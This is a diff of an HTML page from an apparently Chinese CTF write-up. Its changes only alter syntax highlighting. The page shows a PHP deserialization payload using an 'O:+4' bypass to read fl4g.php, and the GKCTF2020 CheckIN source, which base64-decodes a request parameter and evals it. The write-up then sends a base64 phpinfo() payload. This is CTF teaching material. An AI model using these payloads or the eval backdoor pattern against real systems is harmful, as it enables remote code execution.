@@ -295,25 +295,25 @@ echo (base64_encode($b));
 <div class="hljs"><pre><code>O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;
 O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;
 TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==          </code></pre></div>
-<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a><code>[GKCTF2020]CheckIN</code></h2><div class="hljs"><pre><code>&lt;?php 
-highlight_file(__FILE__);
-class ClassName
-&#123;
-        public $code = null;
-        public $decode = null;
-        function __construct()
-        &#123;
-                $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;];          ##以Ginkgo传参                  
-                $this-&gt;decode = @base64_decode( $this-&gt;code );           ##base64解码
-                @Eval($this-&gt;decode);      ##执行
+<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a><code>[GKCTF2020]CheckIN</code></h2><div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassName</span></span>
+<span class="hljs-class"></span>&#123;
+        <span class="hljs-keyword">public</span> $code = <span class="hljs-literal">null</span>;
+        <span class="hljs-keyword">public</span> $decode = <span class="hljs-literal">null</span>;
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">        </span>&#123;
+                <span class="hljs-keyword">$this</span>-&gt;code = @<span class="hljs-keyword">$this</span>-&gt;x()[<span class="hljs-string">&#x27;Ginkgo&#x27;</span>];          <span class="hljs-comment">##以Ginkgo传参                  </span>
+                <span class="hljs-keyword">$this</span>-&gt;decode = @base64_decode( <span class="hljs-keyword">$this</span>-&gt;code );           <span class="hljs-comment">##base64解码</span>
+                @<span class="hljs-keyword">Eval</span>(<span class="hljs-keyword">$this</span>-&gt;decode);      <span class="hljs-comment">##执行</span>
         &#125;
 
-        public function x()
-        &#123;
-                return $_REQUEST;
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">        </span>&#123;
+                <span class="hljs-keyword">return</span> $_REQUEST;
         &#125;
 &#125;
-new ClassName();      </code></pre></div>
+<span class="hljs-keyword">new</span> ClassName();</code></pre></div></code></pre>
 <p>先传个phpinfo吧   </p>
 <div class="hljs"><pre><code>phpinfo();
 cGhwaW5mbygpOw==  </code></pre></div>
